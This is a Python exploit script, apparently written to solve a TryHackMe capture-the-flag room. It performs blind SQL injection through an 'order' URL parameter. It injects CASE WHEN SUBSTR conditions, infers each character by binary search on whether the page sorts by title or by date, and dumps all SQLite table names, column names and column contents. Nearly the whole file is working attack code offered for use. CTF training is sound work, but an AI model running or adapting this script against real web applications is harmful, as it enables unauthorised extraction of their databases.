#!/usr/bin/python3
# Developed for solving THM ROOM: https://tryhackme.com/room/prioritise
# This script also checks for whole database for table_names, column names and their data.
import sys
import requests
import string
from colorama import Fore

# apple date 31
# ball date 20
# cat date 10
def checkSortOrder(response: requests.Response) -> bool:
    html = response.text
    if html.find('apple') < html.find('cat'):   # means sorted by title
        return True
    elif html.find('apple') > html.find('cat'): # means sorted by date   
        return False

def send_g(url, query):
    try:
        r = requests.get(url + query)
        return checkSortOrder(r)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)

def binsearch(addr, query_payload,info_name):
    url = f"http://{addr}/?order="
    print(f'Retrieving {info_name}')
    data = ""
    # if info_name.lower() == 'flag':
    password_len = 38
    
    

    # Printable characters
    characters = [chr(i) for i in range(33, 127)]
    
    for i in range(1 , password_len):
        high = len(characters) - 1
        low = 0
        mid = (high + low) // 2
        while low <= high:
            h = characters[mid]
            query = f"CASE WHEN SUBSTR(({query_payload}),{i},1) < '{h}' THEN title ELSE date END -- -"

            resp = send_g(url, query)
            if resp == True:
                high = mid - 1
            else:
                low = mid + 1
            mid = (high + low) // 2
            
        h = characters[low - 1]
        query = f"CASE WHEN SUBSTR(({query_payload}),{i},1) = '{h}' THEN title ELSE date END -- -"
        resp = send_g(url, query)
        if resp == True:
            data += characters[low - 1]
            print(data)
        else:
            break
    print(f"{Fore.GREEN}[+] {info_name}: {data}{Fore.RESET}")
    return data

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    
    table_name_query = "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"
    table_names = binsearch(sys.argv[1],table_name_query,'table_names:')
    
    table_names = table_names.split(',')
    tables_cols = {}
    for table_name in table_names:
        table_col_query = f"SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('{table_name}')"
        table_cols = binsearch(sys.argv[1],table_col_query,f'table:{table_name} columns:')
        tables_cols[table_name] = table_cols.split(',')
        # print(table_name_query.split(','))
    
    for table_name, cols in tables_cols.items():
        for col in cols:
            print(f"Data from table:{table_name} column:{col}")
            table_col_info_query = f"SELECT GROUP_CONCAT({col}) FROM {table_name}"
            table_cols_data = binsearch(sys.argv[1],table_col_info_query,f'table:{table_name} column:{col} data:')
    
